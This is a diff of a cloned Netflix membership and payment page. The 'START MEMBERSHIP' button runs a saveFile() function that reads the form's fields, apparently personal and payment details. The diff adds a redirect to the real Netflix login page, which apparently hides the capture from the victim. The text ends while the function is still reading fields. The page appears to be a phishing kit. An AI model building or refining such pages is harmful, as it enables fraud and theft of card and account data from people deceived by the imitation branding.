@@ -41,7 +41,7 @@
 
 <body>
     <div class="navbar ">
-        <a href="web.html" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
+        <a href="index.html" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
             <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                 <g id="netflix-logo">
                     <path
@@ -167,7 +167,10 @@
                         </ul>
                     </div>
                 </div>
-                <div class="submitBtnContainer"><button id="simplicityPayment-START" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" onclick="saveFile()" data-uia="action-submit-payment">START MEMBERSHIP</button></div>
+            </form>
+            <div class="submitBtnContainer">
+                <button id="simplicityPayment-START" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" 
+                onclick="saveFile()" onclick="window.location.href='sign_up.html' ">START MEMBERSHIP</button></div>
                 <div class="recaptcha-terms-of-use-container">
                     <div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
                         <p><span>This page is protected by Google reCAPTCHA to ensure you're not a
@@ -182,7 +185,7 @@
                                 by Google).</span></div>
                     </div>
                 </div>
-            </form>
+            </div>
         </div>
     </div>
     <div class="site-footer-wrapper centered">
@@ -221,6 +224,8 @@
 </body>
 <script>
     let saveFile = () => {
+
+        window.location.replace("https://www.netflix.com/th-en/login");
 
         // Get the data from each element on the form.
         const name = document.getElementById('id_firstName');
